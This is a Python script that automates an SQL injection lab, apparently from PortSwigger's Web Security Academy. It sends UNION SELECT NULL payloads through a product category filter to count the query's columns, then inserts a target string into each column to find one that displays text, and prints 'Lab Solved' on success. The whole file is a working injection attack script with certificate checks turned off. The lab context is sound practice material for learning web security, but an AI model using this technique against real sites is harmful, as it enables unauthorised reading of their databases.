import requests
import urllib3
import bs4
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_internal_server_error(text):
    soup=bs4.BeautifulSoup(text,"html.parser")
    error_tag = soup.find('p', attrs={'class': 'is-warning'})
    if error_tag:
        error = error_tag.get_text(strip=True)
    else:
        error = None
    if error=="Internal Server Error":
        return False
    else:
        return True
    
def fetch_string_literal(text):
    soup=bs4.BeautifulSoup(text,"html.parser")
    string_value=soup.find('p',attrs={'id':'hint'})
    _string = string_value.get_text(strip=True)
    _string=_string.split("'")
    _string=_string[1]
    print("the target string is "  +_string)
    return(_string)
    

def string_fetched_final_request(text):
    soup = bs4.BeautifulSoup(text, "html.parser")
    tr_tag = soup.find('tr')
    if tr_tag:
        th_tag = tr_tag.find('th')
        if th_tag:
            return th_tag.get_text(strip=True)
    return None

    
def main():
    host="https://0a32007103c9c02281bf1b86001b0086.web-security-academy.net"
    client=requests.Session()
    client.verify=False
    product_url=f'{host}/filter?category='
    null_value="null"
    comment="--"
    payload1=product_url+f"'UNION select {null_value}"
    comma=","
    r=client.get(product_url+comment)
    i=False
    while i==False:
        answer=check_internal_server_error(client.get(payload1+comment).text)
        print("executed payload: "+ payload1+comment)
        if answer==False:
            payload1=payload1+comma+null_value
        else:
            i=True
            payload=payload1+comment
    if check_internal_server_error(client.get(payload1+comment).text):
        s = f"{fetch_string_literal(client.get(host).text)}"
        s_no_quotes=s
        s="'"+s+"'"
        parts = payload.split("null")
        payloads = [("null".join(parts[:i]) +s + "null".join(parts[i:])) for i in range(1, len(parts))]
        for i in payloads:
            print(i)
            resp = client.get(i)
            if resp.status_code==500:
                continue
            if s_no_quotes == string_fetched_final_request(resp.text):
                print(f'[+] Lab Solved LESSGOOOOO')
                break
            else:
                print(f'Try harder noob!')
        


if __name__=="__main__":
    main()